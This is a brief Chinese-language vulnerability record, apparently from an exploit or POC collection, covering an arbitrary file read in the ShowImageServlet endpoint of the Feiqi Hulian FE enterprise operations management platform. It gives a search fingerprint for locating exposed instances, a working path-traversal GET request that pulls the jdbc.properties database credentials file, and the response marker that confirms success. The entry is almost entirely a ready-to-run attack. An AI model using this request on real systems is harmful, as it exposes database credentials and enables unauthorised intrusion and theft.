# 飞企互联-FE企业运营管理平台ShowImageServlet接口任意文件读取漏洞

飞企互联-FE企业运营管理平台ShowImageServlet接口 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="飞企互联-FE企业运营管理平台"`
- **请求**：`GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print HTTP/1.1`
- **响应特征**：200 jdbc